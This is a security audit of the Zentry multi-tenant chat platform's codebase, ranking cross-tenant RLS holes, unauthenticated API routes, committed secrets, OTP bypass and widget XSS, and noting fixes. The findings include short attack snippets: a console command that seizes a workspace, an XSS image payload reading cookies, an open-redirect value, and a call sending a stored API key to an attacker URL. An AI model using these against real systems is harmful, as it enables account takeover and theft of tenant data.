# Zentry codebase audit

_Scope: the whole repository at commit `8477f1c` (Next.js app, `widget/`, `supabase/migrations/`, scripts). This was a read-only review; no application code was changed. Ranks: **High** = cross-tenant data exposure, account or workspace takeover, leaked secrets, or a production-breaking bug. **Medium** = a real defect or exploitable weakness with a narrower blast radius. **Low** = hygiene, hardening, or maintainability._

> **Caveat on the database:** the migrations do not contain the full schema. `workspaces`, `articles`, `workspace_integrations`, `platform_settings`, `email_verifications` and several RPCs and columns were created outside the repo (see M-13). Every RLS finding below is based on the policies as the migrations leave them. Confirm against the live project with `select * from pg_policies where schemaname = 'public';` and `\df+ public.*`. If someone has since fixed a policy by hand in the dashboard, that fix is not recorded here either.

---

## Summary: can one workspace read another's data?

**Yes, in several independent ways.** Several of them need no account at all.

1. **Anyone with the public anon key**, which ships inside `public/widget.js`, can read every workspace's conversations, non-internal messages, visitors (names, emails, IPs) and agents (emails), and can modify conversations, messages and visitors. Cause: anon RLS policies with `USING (true)` (H-3).
2. **Any signed-in user can read and write every workspace**, because `is_current_user_super_admin()` returns `true` for everyone (H-2), and because an agent can rewrite its own `workspace_id`/`role` (H-4).
3. **Unauthenticated API routes** run the service role (or the anon key) against caller-supplied workspace and conversation IDs, with no membership check (H-5).
4. **Super-admin RPCs** (`fn_merge_workspaces`, `fn_get_company_analytics`, `fn_get_platform_*`) can be called by anyone, for the same root cause as item 2 (H-2).
5. **The service-role key is committed** in `env.download` (H-1), which bypasses RLS entirely.

The application-level guards (`assertAdminUser`, `assertAgent`, `assertSuperAdmin`) are mostly correct, but they read `agents.workspace_id` and `agents.role`, which any user can edit (H-4). They also run on top of an RLS layer that doesn't hold (H-2, H-3).

---

## High

### H-1: Production secrets committed to the repo
- **Where:** `env.download` (added in `e63867d`), which contains `SUPABASE_SERVICE_ROLE_KEY`, `VERCEL_API_TOKEN` and `VERCEL_PROJECT_ID` for project `vfjsaynnubxywdbevxtx`.
- **Impact:** the service-role key bypasses every RLS policy: full read/write/delete on all tenants, plus `auth.admin` (create, delete or impersonate users). The Vercel token can change domains and deployments on the project.
- **Fix:** rotate both keys now, delete the file, and purge it from git history (`git filter-repo`). Add `env.download` and `*.download` to `.gitignore`. Turn on secret scanning.

### H-2: `is_current_user_super_admin()` is true for every caller
> **Fixed** by `supabase/migrations/20261009100000_tenant_isolation_fixes.sql`, covered by `ticket-isolation.db.test.ts`. The slug and custom-domain uniqueness checks that depended on the bug now read `public_workspaces`. Still open: the `current_user` checks inside `fn_get_platform_analytics` and the second `fn_get_platform_companies_summary`, and the unguarded `fn_get_company_analytics` (M-4).

- **Where:** `supabase/migrations/20261004000000_super_admin_data_correctness_and_orphans.sql:5-21`.
- **Problem:** the function is `SECURITY DEFINER` and returns true when `current_user IN ('postgres','supabase_admin','service_role')`. Inside a security-definer function, `current_user` is the function **owner** (`postgres`), so the check passes for `anon` and `authenticated` alike. The same mistake appears in `fn_get_platform_analytics` and the second `fn_get_platform_companies_summary` (`20261004020000_…:36-39, 522-526`: `IF current_user <> 'postgres' …`).
- **Impact:**
  - `fn_is_workspace_member` and `fn_is_workspace_admin` (redefined in `20261002030000` to `OR is_current_user_super_admin()`) return true for every workspace. Every "workspace members can …" policy on `workspaces`, `articles`, `help_sections`, `article_feedback` and `article_chunks` is therefore open to any signed-in user. That includes reading other tenants' `ai_settings.api_key` and `smtp_settings.pass`, and editing or deleting their articles.
  - Every policy in `20261002030000` (conversations, messages, visitors, agents, internal_notes, canned_responses, super_admin_audit_logs) has `OR public.is_current_user_super_admin()`, so any authenticated user gets full access to all tenants' rows.
  - `fn_merge_workspaces(source, target)` is callable through PostgREST by anyone. `EXECUTE` is granted to `PUBLIC` by default and is never revoked, so an anonymous request can move all of a victim's conversations, visitors, articles and agents into the attacker's workspace and soft-delete the victim.
  - `fn_get_platform_companies_summary` returns every workspace, its owner email, and orphan visitor names and emails to any caller.
- **Fix:** define it as `SELECT coalesce((SELECT is_super_admin FROM agents WHERE id = auth.uid()), false) OR auth.role() = 'service_role'`. Remove every `current_user` check from definer functions. `REVOKE EXECUTE … FROM PUBLIC, anon` on all admin RPCs and grant only to `authenticated`/`service_role`.

### H-3: Anonymous role can read and modify every tenant's chat data
> **Fixed in two steps.** `20261106090000_widget_visitor_sessions.sql` gives each visitor a secret token (`visitor_sessions`, hash only) and moves everything the widget does into `fn_widget_*` functions that check it; live updates are broadcasts on a per-visitor secret topic, with polling as the fallback. The widget (`widget/src/index.ts`) uses them, and falls back to the old access on a project without the migration. `20261107090000_widget_anon_lockdown.sql` then revokes the anon table access and the id-only RPCs (applied in production 2026-10-13, after the new widget was live; emergency undo in `supabase/pending/`). Tests: `src/lib/widget/widget-session.db.test.ts`; the whole database suite also passes with the lockdown applied. Follow-up `20261108090000_widget_tracking_tokens.sql`: the tracking functions (heartbeat, page trail, offline, timezone) also need the token, and `/api/tracking`, `/api/visitor/geo` and `/api/csat/rate` check it on the server (`src/lib/widget/visitor-token.ts`, tests in `src/app/api/tracking/visitor-routes.test.ts`). The emailed CSAT link now always needs its signed token.

- **Where:** `20261002030000_super_admin_lockdown_and_rls.sql` §7.1–7.4:
  - `conversations`: anon `SELECT USING (true)`, `UPDATE USING (true) WITH CHECK (true)`, `INSERT WITH CHECK (true)`
  - `messages`: anon `SELECT USING (is_internal IS NOT TRUE)`, `UPDATE USING (true)`, `INSERT WITH CHECK (sender_type = 'visitor')` into any conversation
  - `visitors`: anon `SELECT/UPDATE USING (true)`, `INSERT WITH CHECK (true)`
  - `agents`: anon `SELECT USING (true)`, which exposes every agent's email, role and `is_super_admin`
- **Impact:** the anon key is public (it's in `public/widget.js` and hardcoded in 20+ source files). With it, anyone can `select * from messages` / `conversations` / `visitors` across all workspaces, rewrite message content, reassign or close conversations, or move a conversation into another workspace (`UPDATE … SET workspace_id`). Because `messages`, `conversations` and `visitors` are in the `supabase_realtime` publication, an anonymous websocket subscriber also receives every tenant's traffic live.
- **Fix:** give visitors a credential: either a signed visitor JWT minted by a route that knows the workspace, or a random per-conversation secret stored client-side. Then replace the anon table policies with `SECURITY DEFINER` RPCs that check that credential. Anon should have no direct `SELECT`/`UPDATE` on these tables.

### H-4: Any user can join any workspace as admin by editing their own `agents` row
> **Fixed** by the same migration (trigger `trg_guard_agent_membership`), with tests in `ticket-isolation.db.test.ts`.

- **Where:** RLS policy "Allow agents to update their own profile" / "…insert their own agent profile" (`20261002030000:383-404`: `USING/WITH CHECK (auth.uid() = id)` with no column restriction). The dashboard auto-creates new users with `role: 'owner'` from the browser (`src/app/dashboard/page.tsx:210-218`).
- **Exploit:** sign up, then from the browser console run `supabase.from('agents').update({ workspace_id: '<victim id>', role: 'admin' }).eq('id', myId)`. Workspace IDs are public, because they appear in every embed snippet and widget request. After that, `current_user_workspace_ids()`, `fn_is_workspace_admin`, `assertAdminUser` and `assertAgent` all treat the attacker as an admin of the victim. Only `is_super_admin` is protected (by `fn_protect_agent_super_admin`).
- **Fix:** add a `BEFORE UPDATE/INSERT` trigger that rejects changes to `workspace_id` and `role` unless the caller is service-role or an admin of the target workspace. Move team changes exclusively into server actions. Stop creating agents with `role: 'owner'` on the client.

### H-5: Unauthenticated API routes act on arbitrary workspaces and conversations
> **Partly fixed** by the teams-and-roles change: every agent-facing route below now calls `guardConversation` / `guardWorkspace` / `guardMember` (`src/lib/team/route-guard.ts`) and runs through the caller's session where it can; `smtp/save`, `ai/suggest` and `conversations/search` were deleted; `auto-close` needs a workspace and edit rights; `GET /snooze` and `unread-notifications` need `CRON_SECRET` (or a signed-in member for the latter); the bot's handover calls the auto-assign function directly instead of fetching the route. Still open: widget-facing routes (`ai/auto-respond`, `upload*`, `visitor/geo`, `tracking`, `help/*`), `agent/webhook`, `cron/verify-domains`, and `/api/channels/*` inbound webhooks.
None of these routes checks a session, a secret or membership. The ones that use `serviceClient()` bypass RLS entirely, and the rest rely on the anon policies from H-3.

| Route | Client | What an anonymous caller can do |
|---|---|---|
| `POST /api/workspace/smtp/save` | service role | Overwrite **any** workspace's `smtp_settings`, for example to redirect customer emails through an attacker's SMTP server. The UI doesn't use this route. |
| `POST /api/conversations/auto-close` | service role | Close every open conversation on the platform (omit `workspace_id`, set `days: 0.0001`) and post system messages into them. |
| `GET /api/conversations/search` | anon | Get the 50 most recent conversations of **all** workspaces, with visitor, agent and messages embedded. The `q` value is also interpolated into a PostgREST `.or()` filter (filter injection). The UI doesn't use this route. |
| `POST /api/agent/suggest` | service role | Read the last 15 messages of any conversation, **including internal notes**, and send them to the LLM or LangGraph webhook of a workspace the attacker chooses. The returned draft leaks the content. |
| `POST /api/ai/analyze`, `/api/ai/suggest` | service role | `workspace_id` is never checked against the conversation. Analyze **writes** tags, summary and sentiment onto any conversation and returns its summary. |
| `POST /api/conversations/merge`, `/snooze`, `GET /snooze` | anon | Move all messages of one conversation into another, across tenants, or snooze and reopen conversations. |
| `GET /api/analytics?workspace_id=` | cookie session or anon | Per-agent names and emails plus metrics for any workspace. Defaults to the seed workspace when the parameter is missing. |
| `POST /api/translation/translate`, `/api/translation/process-message`, `/api/ai/auto-respond`, `/api/agent/suggest` | service role | Spend **any** workspace's stored LLM API key (CORS `*`), which makes cost abuse easy. |
| `POST /api/notifications/dispatch` | anon | `event: 'test_slack'` makes the server POST to any URL (SSRF). `new_message` returns the assigned agent's email. |
| `POST /api/workspace/smtp/test` | none | Open SMTP relay and port prober: the server connects to any host:port and sends mail to any recipient. |
| `GET/POST /api/cron/unread-notifications`, `/api/cron/verify-domains?force=1` | service role | Trigger mass email sends or Vercel API calls on demand. Neither checks `CRON_SECRET`. |
| `POST /api/agent/webhook` | anon | Accepts content for any conversation with no signature check (it currently fails RLS, see M-9). |

- **Fix:** add one helper, for example `requireWorkspaceMember(req, workspaceId)`, that reads the cookie session and checks membership. Then always load the conversation and assert `conv.workspace_id === workspaceId` before using it. Widget-facing routes should instead require the visitor credential from H-3. Crons should check `Authorization: Bearer $CRON_SECRET`. Delete the routes nothing calls (see Dead code).

### H-6: Signup verification can be bypassed, and unconfirmed accounts can be taken over
> **Fixed:** `src/app/actions/auth-verification.ts`, `src/lib/auth/verification-code.ts`, and `supabase/migrations/20261111090000_email_verifications_brute_force.sql`.

- **Where:** `src/app/actions/auth-verification.ts`.
- **Problems:**
  - When platform SMTP is missing or fails, the action **returns the OTP to the browser** (`code: warning ? code : undefined`, line 139), and `signup/page.tsx:172` displays it. Anyone can then "verify" an email address they don't own.
  - For an existing **unconfirmed** user, `sendSignupVerificationCodeAction` calls `updateUserById(… { password })` with an attacker-supplied password (line 57). Users invited through `inviteUserByEmail` (`admin.ts`, `platform.ts`) stay unconfirmed until they accept. An attacker who knows an invitee's email can set the password, confirm with the leaked or brute-forced code, and log in as that agent inside the victim's workspace.
  - There's no attempt limit or lockout on `verifySignupCodeAction`: a 6-digit code with a 15-minute lifetime can be brute-forced. The code comes from `Math.random()`.
- **Fix:** never return the code, and fail closed when email can't be sent. Never change the password of an existing account from this flow. Count attempts per email, lock after about 5, and use `crypto.randomInt`.

### H-7: Stored XSS in the embeddable widget, which runs on customer websites
> **Fixed:** `widget/src/index.ts`, `src/lib/widget/article-markdown.ts`, and rebuilt `public/widget.js`.

- **Where:** `widget/src/index.ts`.
  - `formatMarkdownToHtml` (line ~638), used for help articles, escapes `& < >` but **not quotes**, then inserts URLs into attributes: `![x](https://a/"onerror="alert(document.cookie))` produces `<img src="https://a/" onerror="…">`. Link `href` and image `alt` have the same problem.
  - `section.icon` (lines 844, 891), `this.config.logoUrl` (lines 2517, 2599, 5691) and `initials` inside an inline `onerror` handler are written into `innerHTML` without escaping.
- **Impact:** script runs in the **customer's site origin** for every visitor. Together with H-2/H-4, where any user can edit any workspace's articles and sections, an attacker can plant script on every Zentry customer's website.
- **Fix:** escape quotes in `formatMarkdownToHtml`, or render through `formatChatMarkdown`, which escapes everything first. Build attribute-bearing elements with `document.createElement` plus `setAttribute`, and validate URL schemes. Then rebuild `public/widget.js`.

### H-8: Inviting a user silently moves them out of their current workspace
> **Fixed:** the old `inviteAgentAction`, `updateAgentRoleAction` and `removeAgentAction` are gone. `inviteMemberAction` (`src/app/actions/team.ts`) refuses anyone who already works in another workspace, and role/deactivation changes go through database functions that refuse cross-workspace targets.
- **Where:** `inviteAgentAction` (`src/app/actions/admin.ts`), which upserts `agents` on `id` with the inviter's `workspace_id`. `findOrCreateOwnerAgent` and `createWorkspaceAction` behave the same way.
- **Impact:** an admin of workspace A can invite the owner or agents of workspace B by email and pull them out of B, with role `admin` if they like. B loses its team, and the moved users now see A. Agents can belong to only one workspace, so this is destructive.
- **Fix:** refuse to invite a user who already has a different `workspace_id`, or move to a `workspace_members` join table with an accept step.

---

## Medium

### M-1: Tenant secrets are stored in plaintext and sent to every agent's browser
`workspaces.ai_settings.api_key` and `workspaces.smtp_settings.pass` live in the row that `dashboard/page.tsx`, `admin/page.tsx` and many actions fetch with `select('*')`, so they reach the client of every agent, not just admins. Store them in a separate table (or Supabase Vault) that only `service_role` can read, and return masked values to the UI.

### M-2: Non-admin agents can change AI settings and leak the API key
> **Fixed for roles:** `saveAiProviderAction`, `testAiProviderAction` and `updateHelpTabSettingsAction` now need `manage_settings` (owner/admin), and light agents can't write help-centre or knowledge content. Still open: the host allow-list and never combining an override URL with the stored key.
`saveAiProviderAction` and `testAiProviderAction` (`src/app/actions/knowledge.ts`) only call `assertAgent`, so any agent passes. `testAiProviderAction(ws, { baseUrl: 'https://attacker' })` sends the **stored** API key to an attacker-controlled URL, and `base_url` is otherwise unrestricted (SSRF). `updateHelpTabSettingsAction` (helpdesk.ts) is also an admin setting behind `assertAgent`. Fix: use `assertAdminUser`, allow-list provider hosts, and never combine an override URL with the stored key.

### M-3: SECURITY DEFINER RPCs callable by anon with no ownership checks
- `fn_assistant_notes(p_workspace_id)` lets anyone read any workspace's internal notes marked `assistant`.
- `fn_record_unanswered_question(_semantic)` lets anyone flood another workspace's knowledge-gap backlog.
- `fn_mark_messages_delivered/_read(conversation_id, exclude_sender)` lets anyone forge receipts on any conversation.
- `fn_submit_article_feedback` doesn't check that the article belongs to `p_workspace_id`, and `fn_track_article_view` lets anyone inflate any counter.
- `fn_get_workspace_config`, `fn_merge_workspaces`, `fn_get_platform_*`, `fn_get_company_analytics`, `fn_get_visitor_conversations`, `fn_track_article_view` and `fn_submit_article_feedback` lack `SET search_path` (search-path hijack hardening).

### M-4: `fn_get_company_analytics` has no permission check
> **Fixed:** `supabase/migrations/20261113090000_platform_super_admin_guards.sql`.

(`20261004020000_…:239`). It returns any workspace's daily volumes, health flags and samples of unanswered customer questions to any caller. Add the corrected super-admin guard and revoke anon execute.

### M-5: Canned-reply update and delete are not scoped to the workspace
> **Fixed:** `src/app/actions/admin.ts` (tested in `src/app/actions/canned-responses.test.ts`).

`updateCannedResponseAction` and `deleteCannedResponseAction` (`admin.ts`) filter only by `id`, relying on RLS (which is broken, see H-2). An admin of A can edit or delete B's replies by ID. Add `.eq('workspace_id', workspaceId)`.

### M-6: Articles can point at another workspace's section
`createArticleAction` and `updateArticleAction` (`helpdesk.ts`) read `help_sections` by `section_id` without `.eq('workspace_id', …)`. This copies foreign section names into `category` and creates cross-tenant foreign keys.

### M-7: Open redirect in OAuth callback
> **Fixed:** `src/app/auth/callback/route.ts` (tested in `src/app/auth/callback/route.test.ts`).

`src/app/auth/callback/route.ts`: `NextResponse.redirect(\`${baseUrl}${next}\`)` with `next=@evil.com` produces `https://zen-try.com@evil.com`. It also trusts `x-forwarded-host`. Require `next` to start with a single `/` (the same rule `login/page.tsx` already uses).

### M-8: Inbound channel webhooks: no signature check, and messages go to an arbitrary tenant
> **Fixed:** retired legacy `src/app/api/webhooks/meta/route.ts` and `src/app/api/webhooks/linkedin/route.ts`; inbound messages route through `/api/channels/[channel]/webhook` with HMAC signature verification.

`api/webhooks/meta` and `api/webhooks/linkedin` don't verify `X-Hub-Signature-256` or the LinkedIn signature, and they route every inbound message to `from('workspaces').select('id').limit(1)`, which is whichever workspace Postgres returns first. With the anon key RLS hides `workspaces`, so the feature is currently dead. If someone "fixes" it by switching to the service role, all WhatsApp/Messenger/LinkedIn messages will land in one arbitrary tenant. Map `phone_number_id` or `page_id` to a workspace through `workspace_integrations`.

### M-9: Server features silently broken because they use the anon key where RLS blocks anon
> **Fixed:** `src/lib/agent/langgraph.ts`, `src/lib/channels/dispatcher.ts`, and `src/app/api/agent/webhook/route.ts` use `serviceClient()`, `src/app/api/conversations/auto-assign/route.ts` guards the caller, and widget welcome calls `fn_widget_welcome` (`supabase/migrations/20261106090000_widget_visitor_sessions.sql`).

- `src/lib/agent/langgraph.ts`, `src/lib/channels/dispatcher.ts`, `api/agent/webhook`, `api/webhooks/*` and `api/conversations/auto-assign` create anon clients, so they can't read `workspaces` or `workspace_integrations`, and they can't insert `sender_type: 'ai'` messages (anon insert requires `'visitor'`). LangGraph, outbound WhatsApp/Meta/LinkedIn and the agent webhook therefore no-op or 500.
- The widget's auto-welcome message (`widget/src/index.ts:~5021`) inserts `sender_type: 'agent'` as anon and is rejected by RLS, and the result isn't checked.

### M-10: Hooks order violation crashes the visitor sidebar
`src/components/dashboard/VisitorDetailsSidebar.tsx`: there's an early `return` at line ~209 before `useState` at line 278 (ESLint `react-hooks/rules-of-hooks`). Moving from "no visitor" to "visitor" renders a different number of hooks, and React throws "Rendered more hooks than during the previous render".

### M-11: Auth admin user lookups break past a page of users
> **Fixed:** `src/lib/auth/verification-code.ts` (`findAuthUserByEmail`) across `src/app/actions/auth-verification.ts`, `src/app/actions/invite.ts`, and `src/app/actions/platform.ts`.

- `auth-verification.ts` calls `auth.admin.listUsers()` with the default page size (50). Once there are more users, an existing account isn't found (createUser then errors), and `verifySignupCodeAction` confirms nobody.
- `inviteAgentAction` uses `perPage: 1000`, so it breaks after 1,000 users.
- `findOrCreateOwnerAgent` (`platform.ts`) falls back to `crypto.randomUUID()` for `agents.id`, which violates the FK to `auth.users`. The upsert error is ignored, and the workspace ends up with no owner.
- Fix: look users up by email (`getUserByEmail`, or a query on `agents`) and check the errors.

### M-12: Suspension and soft-delete are enforced only in the browser
> **Fixed:** `src/lib/team/access.ts` (tested in `src/lib/team/access.test.ts`) and `supabase/migrations/20261114090000_widget_session_workspace_status.sql` (tested in `src/lib/widget/widget-session.db.test.ts`).

`login/page.tsx` and `dashboard/page.tsx` sign suspended users out on the client. Server actions, API routes and RLS never check `is_suspended` or `deleted_at`, so a suspended tenant keeps full API access. Only `fn_get_workspace_config` blocks the widget.

### M-13: The schema can't be rebuilt from the repo, and migrations contain tenant-specific data
- These are created outside `supabase/migrations/`, so their RLS can't be reviewed:
  - Tables: `workspaces`, `articles`, `workspace_integrations` (which holds Slack webhooks and Meta tokens), `platform_settings`, `email_verifications`
  - Columns: `workspace_id` on agents, visitors, conversations and canned_responses; `messages.is_internal` and `messages.metadata`; `conversations.ai_mode`, `channel` and `tags`
  - RPCs: `fn_upsert_visitor`, `fn_visitor_heartbeat`, `fn_get_or_create_conversation`, `fn_mark_conversation_messages_as_read`
  - Trigger: `handle_new_message`
- Migrations also hardcode production data:
  - Personal emails promoted to super admin (`20261002030000:9-11`)
  - Specific article and workspace UUIDs (`20261003040000`)
  - The seed "Chatify" workspace, which is assigned to *the first auth user whose email matches `%admin%`* (`20261004030000:32-41`). That makes an arbitrary user the owner of an enterprise-plan workspace.
- Fix: dump the live schema into a baseline migration (`supabase db pull`) and move seed data to `supabase/seed.sql`.

### M-14: Cross-tenant leak through the platform Slack fallback
`api/notifications/dispatch` uses `process.env.SLACK_WEBHOOK_URL` for any workspace that has no `workspace_integrations` row. Visitor names, emails and first messages from every such tenant get posted to the platform's Slack.

### M-15: Unauthenticated uploads and unauthenticated server actions
> **Fixed:** `src/app/api/upload/route.ts`, `src/app/api/upload/sign/route.ts`, and `src/app/actions/domain.ts` (tested in `src/app/api/upload/upload-auth.test.ts` and `src/app/actions/domain.test.ts`).

- `/api/upload` and `/api/upload/sign` let anyone store files (up to 15 MB, SVG allowed) in the platform's Cloudinary account.
- `registerHelpBaseDomainAction` (`domain.ts`) has **no auth check** and calls the Vercel API.
- `getCustomDomainGuideAction` has no guard; it relies on RLS and triggers Vercel verify calls.

### M-16: Missing error handling that leaves data half-written
- `api/conversations/merge` moves `messages`, and then the `internal_notes` update throws (anon has no policy). Messages are moved but the source isn't closed. The final updates and inserts ignore `error`.
- `createWorkspaceAction` ignores the result of the `agents` upsert and of the canned-reply seed, so a workspace can exist with no linked owner agent.
- In `cron/unread-notifications`, one bad `visitor.current_url` makes `new URL()` throw and aborts the whole batch. Failed sends are retried forever with no backoff.
- Webhook ingestion (`handleIncomingChannelMessage`) ignores insert errors and returns 200, so inbound messages are lost silently.
- `recordSuperAdminAudit` swallows insert failures, so admin actions can go unaudited.
- Route handlers return raw `error.message` from Postgres or providers to the caller (information disclosure).

### M-17: Auto-reply concurrency control is per-instance only
`api/ai/auto-respond` locks with in-memory `Set`s and busy-waits up to 45 s. On Vercel each instance has its own memory, so the locks don't serialize anything, and a waiting request holds a function slot. The DB unique indexes are the only real guard. Use a row lock or advisory lock, or an `ai_reply_jobs` table.

### M-18: Cron jobs aren't scheduled anywhere
> **Fixed:** `supabase/migrations/20261104090000_admin_speed_and_cron_schedule.sql` (scheduled via pg_cron/pg_net) and `vercel.json`.

There's no `vercel.json` or cron config. Unread-email alerts, domain verification and snooze reopening only run when an admin's dashboard happens to call them, or not at all.

### M-19: Email HTML injection
> **Fixed:** `src/lib/email/layout.ts` (`renderEmail` with HTML entity escaping) and `src/lib/email/smtp.ts`.

Visitor-controlled `visitorName` and `messageSnippet` are interpolated unescaped into Resend HTML (`notifications/dispatch`). So is the SMTP host/user in the SMTP test email, and the visitor name in `generateUnreadAlertEmailHtml`.

### Rate limiting: No abuse limits on public endpoints or widget sessions/messages
> **Fixed:** `supabase/migrations/20261115090000_rate_limiting.sql` (for `fn_widget_session` and `fn_widget_send_message`) and `src/lib/rate-limit.ts` (protecting `/api/tracking`, `/api/visitor/geo`, `/api/csat/rate`, `/api/upload`, `/api/upload/sign`, and `/api/ai/auto-respond`).

---

## Low

- **L-1: Hardcoded production Supabase URL and anon key** fallbacks in 20+ files (`src/lib/supabase/*.ts`, `src/middleware.ts`, every legacy API route, `verify_*.mjs`). A misconfigured preview or local run silently talks to production. Fail fast when env vars are missing.
- **L-2: Demo credentials** (`agent@zentry.io` / `ChatifyDemo2026!`) are hardcoded in `login/page.tsx:152-155`. If that account exists, it's a known password on production.
- **L-3: `middleware.ts` is deprecated** in Next 16 (`node_modules/next/dist/docs/01-app/03-api-reference/03-file-conventions/middleware.md`). Rename it to `proxy.ts`.
- **L-4: The middleware does 1–3 Supabase queries on every request**, including API and asset requests not covered by the matcher. Each custom-domain or subdomain hit does a `public_workspaces` lookup. Cache these lookups or narrow the matcher.
- **L-5: The dashboard subscribes to all `messages` and `conversations` changes with no filter** (`dashboard/page.tsx:775, 947`) and filters on the client. Once RLS is fixed this is just wasteful; today it streams every tenant's traffic (H-2). Add `filter: workspace_id=eq.…` where the table has it.
- **L-6: `/api/analytics`** loads all messages in the date range without a workspace filter, then joins in memory. That's O(platform), not O(tenant).
- **L-7: Unsafe link targets.** Article Markdown (`MarkdownArticleContent.tsx` link/button handlers) and `help_center_header_links` accept any URL scheme. React 19 blocks `javascript:` hrefs, but validate `http(s)`/`mailto` anyway. `VisitorDetailsSidebar` renders a visitor-supplied page URL as a link.
- **L-8 (fixed: tracker.js sends its `data-workspace-id`, the route opens a visitor session and takes the workspace from it, and every later event needs the session token; on a page with the widget, tracker.js does nothing):** `/api/tracking` (used by `public/tracker.js`, offered in admin settings) upserts visitors **without `workspace_id`**, which creates orphan visitors that no dashboard shows.
- **L-9: Duplicate index name.** `idx_articles_workspace_slug` is created on `(workspace_id, lower(slug))` and again with `IF NOT EXISTS` on `(workspace_id, slug)`. The second one is silently skipped.
- **L-10: The lint run fails.** `npm run lint` reports 530 errors and 786 warnings: 385 `no-explicit-any`, 57 `no-this-alias`, 36 `react-hooks/set-state-in-effect`, plus `refs`, `purity` and `immutability` violations. The generated `public/widget.js` is linted too; add it to the ignores.
- **L-11: No automated tests.** The `verify_*.mjs` and `scratch/*.mjs` scripts run against **production** with hardcoded keys, and several of them create users and rows (for example `owner@apexshoes.com` in `verify_multitenant.mjs`).
- **L-12: Stale documentation.** `docs/ARCHITECTURE.md` references RPCs that don't exist in the code (`fn_register_user`, `fn_verify_email_code`). The admin middleware description there says "role admin or owner", but the code checks `is_super_admin`.
- **L-13: Unread-message alerts deep-link with the conversation ID** (`?zentry_conversation=<uuid>`). Together with H-3, the ID alone is enough to read the thread.
- **L-14: `fn_get_workspace_config` exposes data the widget doesn't need.** It returns `auto_assignment` and the full agent list (IDs, names, statuses) for any workspace ID.

---

## Dead code and repo clutter

| Item | Notes |
|---|---|
| `src/lib/vercel.ts` | Nothing imports it; `src/lib/vercel-domains.ts` replaced it. |
| `lib/vercel-domains.ts` (repo root) | A re-export shim outside `src/` that nothing uses. |
| `src/lib/supabase/realtime.ts` | None of `subscribeToConversations/Messages/InternalNotes` or `unsubscribeChannel` is imported; the dashboard builds its channels inline. |
| `src/app/api/ai/suggest`, `src/app/api/conversations/search`, `src/app/api/workspace/smtp/save`, `GET /api/help` | No callers in `src/` or `widget/`, but still deployed and exploitable (H-5). **Delete them.** |
| `src/app/api/cron/verify-domains` | Not scheduled (M-18), and nothing calls it except manually. |
| Exported but never used | `getAdminDataAction` (admin.ts), `saveAiProviderAction` (knowledge.ts), `registerHelpBaseDomainAction` (domain.ts), `sendDomainFailed24hEmail` (email/domain-notifications.ts), `getWorkspaceDomainInfo` (domain.ts), `isLanguageRtl` (translator.ts) |
| Unused constants | `SUPABASE_URL`/`SUPABASE_KEY`/hardcoded anon key in `src/lib/ai/anthropic.ts:10-11` (it uses `serviceClient()`). |
| Duplicate widget (fixed: deleted; `/widget` loads `widget.js`) | `src/components/widget/ChatWidget.tsx` (~1.9k lines) reimplements `widget/src/index.ts` (~6.3k lines) for `/widget` previews. The two drift: different XSS handling, different welcome logic. |
| Legacy tables | `internal_notes` and `conversation_tags` have been superseded by `messages.is_internal` and `conversations.tags`, yet they're still read and written in places (merge route, realtime). |
| Repo clutter | `env.download` (secrets, H-1), `tsconfig.tsbuildinfo` (build cache; it changes on every `tsc`), `supabase/.temp/`, `scratch/` (27 one-off scripts), 17 `verify_*.mjs` files at the root, `process_logo.js`, `public/chat-icon-base64.txt`, and the create-next-app leftovers `public/{file,globe,next,vercel,window}.svg`. Move scripts to `scripts/` without keys, or delete them, and git-ignore the build and temp files. |

---

## Suggested order of work

1. Rotate the Supabase service-role key and the Vercel token; purge `env.download` from history (H-1).
2. Fix `is_current_user_super_admin()` and the `current_user` checks, and revoke `EXECUTE` on the admin RPCs (H-2, M-4). This is one migration and closes the largest hole.
3. Add the `agents` column-protection trigger (H-4) and stop the client-side `role: 'owner'` upsert.
4. Put auth on every API route, and delete the unused ones (H-5).
5. Fix the OTP flow (H-6) and the widget XSS (H-7).
6. Redesign visitor access so anon has no table-wide policies (H-3). This is the biggest change and needs a widget release.
7. Baseline the schema into migrations (M-13) so later RLS changes can be reviewed in PRs.
